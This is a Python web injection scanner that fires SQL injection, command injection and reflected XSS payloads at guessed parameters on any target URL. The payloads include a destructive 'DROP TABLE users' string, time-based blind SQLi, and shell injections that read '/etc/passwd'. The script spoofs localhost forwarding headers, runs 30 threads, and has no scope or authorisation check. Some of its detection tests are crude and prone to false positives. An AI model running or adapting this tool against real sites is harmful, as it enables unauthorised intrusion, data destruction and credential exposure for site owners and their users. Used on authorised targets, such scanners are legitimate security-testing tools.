import requests
import sys
import urllib.parse
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs

class InjectionScanner:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1'
        })
        
        # Comprehensive payload sets
        self.sqli_payloads = [
            "' OR 1=1--",
            "' OR '1'='1",
            "1' OR '1'='1",
            "1 OR 1=1",
            "1' ORDER BY 100--",
            "1' UNION SELECT 1,2,3--",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL,@@version,NULL#",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1\" OR 1=1 --"
        ]
        
        self.cmdi_payloads = [
            ";id",
            ";whoami", 
            ";cat /etc/passwd",
            "|id",
            "||id",
            "&id",
            "&&id",
            "`id`",
            "$(id)",
            "${$(id)}",
            ";ping -c 10 127.0.0.1",
            "|ping -c 10 127.0.0.1"
        ]
        
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/alert(1)//"
        ]
        
        # Common parameters & pages
        self.params = [
            'id', 'q', 'search', 's', 'query', 'page', 'pid', 'cid',
            'cmd', 'exec', 'ping', 'user', 'username', 'pass', 'category'
        ]
        
        self.pages = [
            '/', '/index.php', '/search.php', '/product.php', '/category.php',
            '/admin.php', '/login.php', '/api.php', '/user.php', '/news.php'
        ]
    
    def extract_params(self, url):
        """Extract parameters from URLs"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys()) if params else []
    
    def test_sqli(self, url, param, payload):
        """Test SQL injection"""
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            start = time.time()
            resp = self.session.get(test_url, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            
            # SQLi indicators
            sqli_indicators = [
                'mysql', 'sqlite', 'postgresql', 'sql syntax', 'warning',
                "you have an error", "syntax error", "ora-", "microsoft jet"
            ]
            
            # Blind SQLi (time-based)
            if elapsed > 5:
                return True, "BLIND SQLi (Time-based)"
            
            # Error-based
            if any(indicator in resp.text.lower() for indicator in sqli_indicators):
                return True, "ERROR-BASED SQLi"
                
            # Union-based
            if any(x in resp.text for x in ['1,2,3', 'NULL', 'information_schema']):
                return True, "UNION SQLi"
                
        except Exception:
            pass
        return False, None
    
    def test_cmdi(self, url, param, payload):
        """Test Command Injection"""
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            resp = self.session.get(test_url, timeout=8)
            cmd_indicators = ['uid=', 'gid=', 'daemon', 'www-data', 'root', 'bash']
            if any(ind in resp.text.lower() for ind in cmd_indicators):
                return True, "CMD INJECTION"
        except:
            pass
        return False, None
    
    def test_xss(self, url, param, payload):
        """Test XSS"""
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            resp = self.session.get(test_url, timeout=5, allow_redirects=False)
            xss_indicators = ['alert(1)', payload[:10]]  # Reflect payload
            if resp.status_code < 400 and any(ind in resp.text for ind in xss_indicators):
                return True, "XSS REFLECTED"
        except:
            pass
        return False, None
    
    def scan_page(self, page):
        """Scan single page for all injection types"""
        print(f"[*] Scanning: {page}")
        vulns = []
        
        # Test common params first
        for param in self.params:
            test_url = f"{self.target}{page}?{param}=1"
            
            # SQLi scan
            for payload in self.sqli_payloads:
                vuln, msg = self.test_sqli(test_url, param, payload)
                if vuln:
                    vulns.append(f"[+] SQLi {msg}: {test_url.replace('=1', f'={urllib.parse.quote(payload)}')}")
                    break
            
            # Command Injection
            for payload in self.cmdi_payloads:
                vuln, msg = self.test_cmdi(test_url, param, payload)
                if vuln:
                    vulns.append(f"[+] {msg}: {test_url.replace('=1', f'={urllib.parse.quote(payload)}')}")
                    break
            
            # XSS
            for payload in self.xss_payloads:
                vuln, msg = self.test_xss(test_url, param, payload)
                if vuln:
                    vulns.append(f"[+] {msg}: {test_url.replace('=1', f'={urllib.parse.quote(payload)}')}")
                    break
        
        # Extract params from existing URLs
        for param in self.extract_params(f"{self.target}{page}"):
            if param not in self.params:
                self.params.append(param)
        
        return vulns
    
    def full_scan(self):
        """Full injection scan with concurrency"""
        print(f"[*] Starting injection scan on {self.target}")
        all_vulns = []
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(self.scan_page, page) for page in self.pages]
            
            for future in futures:
                vulns = future.result()
                all_vulns.extend(vulns)
        
        return all_vulns

def save_results(vulns, target):
    """Save results to file"""
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"vulns_{urllib.parse.urlparse(target).netloc}_{timestamp}.txt"
    
    with open(filename, 'w') as f:
        f.write(f"BIJI Injection Scan Results\n")
        f.write(f"Target: {target}\n")
        f.write(f"Time: {time.ctime()}\n\n")
        f.write("\n".join(vulns))
    
    print(f"[+] Results saved: {filename}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 inject.py http://target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = InjectionScanner(target)
    
    vulns = scanner.full_scan()
    
    if vulns:
        print("\n" + "="*60)
        print("VULNERABILITIES FOUND:")
        print("="*60)
        for vuln in vulns:
            print(vuln)
        print("="*60)
        save_results(vulns, target)
    else:
        print("[-] No obvious injections found. Try manual testing.")

if __name__ == "__main__":
    main()